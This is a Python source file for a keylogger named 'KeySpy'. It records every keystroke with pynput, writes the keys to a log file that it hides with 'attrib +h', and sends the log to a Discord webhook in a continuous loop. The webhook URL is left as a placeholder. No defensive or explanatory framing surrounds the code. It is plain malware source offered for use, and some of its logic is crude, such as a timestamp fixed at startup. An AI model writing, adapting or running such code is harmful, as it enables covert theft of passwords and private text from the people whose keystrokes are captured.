from datetime import datetime
from pynput import keyboard
import dhooks
import os

class KeySpy:
    def __init__(self, logs, webhook):
        self.logs = logs
        self.current_time = datetime.now().strftime("%H:%M:%S")
        self.webhook = webhook
        self.bot = dhooks.Webhook(self.webhook)
        self.keylogger_active = True

    def on_press(self, key):
        try:
            # log the pressed key to the file
            with open(self.logs, "a") as f:
                f.write(f"[{self.current_time}] Key pressed: {key.char}\n")
                # Hide the logs file
                os.system(f"attrib +h {self.logs}")
        except AttributeError:
            # handle special keys
            with open(self.logs, "a") as f:
                f.write(f"[{self.current_time}] Special key pressed: {key}\n")

    def start_keylogger(self):
        def save_to_file(data):
            with open(self.logs, "w") as f:
                f.write(data)

        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                save_to_file(f"[{self.current_time}] Keylogger started...")
                self.send_shit()
            except KeyboardInterrupt:
                save_to_file("\n[Keylogger Stopped]\n")
                self.keylogger_active = False

    
    def send_shit(self):
        while self.keylogger_active:
                self.bot.send(self.read_log())

    def read_log(self):
        with open(self.logs, "r") as file:
            keylog_data = file.read()
            return keylog_data
    


if __name__ == "__main__":
    logs_file = "THE LOG FILE"
    webhook_url = "YOUR WEBHOOK"

    discord_logger = KeySpy(logs=logs_file, webhook=webhook_url)
    discord_logger.start_keylogger()
